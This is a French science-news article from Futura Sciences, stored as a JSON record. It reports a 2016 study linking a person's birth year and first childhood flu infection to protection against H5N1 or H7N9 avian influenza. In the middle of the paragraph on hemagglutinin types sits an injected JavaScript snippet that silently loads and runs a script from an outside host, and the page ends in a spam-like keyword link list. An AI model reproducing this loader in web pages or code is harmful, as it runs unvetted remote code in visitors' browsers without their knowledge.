{"title": "Grippe : votre annee de naissance peut vous proteger", "newspaper": "Futura Sciences", "author": ["Marie-Celine Ray"], "date_publi": "2016-11-17", "content": "Votre premiere grippe influence votre immunite pour la vie. C'est ce que suggere une etude publiee en 2016. Les chercheurs ont observe que les personnes nees avant 1968 semblent protegees contre certains virus de la grippe aviaire et celles nees apres 1968 contre d'autres. Article publie le 17 novembre 2016 Il existe une grande diversite de  virus de la grippe  (influenza). Chaque annee, les souches evoluent ;  systeme immunitaire  et virus se livrent a une course sans fin pour s'adapter a ces evolutions. L'une des consequences majeures de l'evolution des virus grippaux est que le  vaccin  de la  grippe  saisonniere doit etre reactualise chaque annee. Des efforts sont tout de meme faits pour mettre au point un vaccin qui confere une protection croisee contre differentes souches. Le virus de la  grippe  possede des  antigenes  de surface comme l' hemagglutinine  (HA), une  proteine  presente sur les virus influenza de type A. HA existe sous differentes versions : le type 1 pour les virus des sous-types H5, H1 et H2 ; le type 2 pour les virus de sous-types H3 et H7. Les virus de grippe aviaire de type A comme  H5N1  et H7N9 infectent des animaux mais aussi des humains, d'ou les craintes recurrentes de  pandemie . Recemment, des virus de grippe aviaire hautement  pathogenes  pour les oiseaux, de type H5N8, ont ete signales dans des pays voisins de la France. D'apres l' OMS , il n'y a pas de risque de  contamination  du H5N8 a l'Homme.  Dans un article paru dans  Science , des chercheurs montrent que la severite d'une infection avec un virus de grippe aviaire depend de la premiere rencontre avec le virus dans l'enfance. En effet, lorsque l'on s'interesse aux infections humaines avec des virus de  grippe aviaire  H5N1 et H7N9 dans le monde depuis 1997, on observe une difference en fonction de la tranche d'age : les cas de H5N1 touchent surtout des enfants et des jeunes adultes, tandis que les cas de H7N9 concernent plutot des adultes ages.  Les cas de grippe aviaire detectes chez nos voisins europeens sont de type H5N8, un virus qui n'est pas connu pour infecter l'Homme. (c) pieter, Shutterstock                               L'immunite vis-a-vis de la grippe aviaire depend de l'age Les virus H5N1 et H7N9 presentent deux types differents d' hemagglutinine  :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  le type 1 pour H5N1 ;  le type 2 pour H7N9. En 1968, il y a eu un changement touchant l'antigene HA de la grippe (du groupe 1 vers le groupe 2) : ceci a modifie les virus grippaux que les gens allaient desormais rencontrer, ce qui expliquerait pourquoi l' immunite  differe en fonction de l'annee de naissance. Grace a des enregistrements historiques, les chercheurs de l'universite de Californie, a Los Angeles, ont reconstruit la susceptibilite de chaque  cohorte  de naissance, en fonction de leur premiere infection grippale. Les personnes nees avant 1968 ont plus de chances d'avoir eu leur premiere infection avec un virus du groupe 1 ; ils semblaient proteges contre des virus du meme groupe comme  H5N1 . En revanche, une premiere infection par un virus du groupe 2, chez les personnes nees apres 1968, protegerait contre le virus du groupe 2 H7N9.  La capacite d'un  virus  a se propager serait donc influencee par son groupe HA et par l'histoire de la population, selon qu'elle a ete exposee ou non a certains virus influenza. Mais la  vaccination  interfere-t-elle avec ce processus ? La population etudiee dans l'article avait surtout une protection naturelle et peu d'antecedents de vaccination. La premiere infection par la grippe pendant l'enfance pourrait donc affecter l'immunite tout au long de la vie : la marque laissee par l'antigene HA rencontre dans l'enfance fournirait une protection profonde et durable contre des infections severes. Comme l'expliquent deux expertes dans  Sciencemag , ce type d' immunite croisee  est quelque chose de frequent dans la nature.  Cela vous interessera aussi Interview 2/5 : la grippe, un risque pandemique ?                       La grippe est une maladie infectieuse qui touche chaque annee une grande partie de la population. Issue de souches virales d'origine animale, elle peut etre dans de rares cas mortelle. Nous avons interviewe Jean-Francois Saluzzo, virologiste aupres de l'OMS, afin qu'il nous parle plus en detail des particularites du virus.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  votre ordinateur ne peut pas etre restaure  |  vaccin grippe grippe saisonniere  |  ecologiquement votre  |  free votre avis  |  compte sur votre diligence  |  quelle votre metier  |  naissance ouragan  |  naissance de metallurgie  |  souris naissance", "theme": "sante"}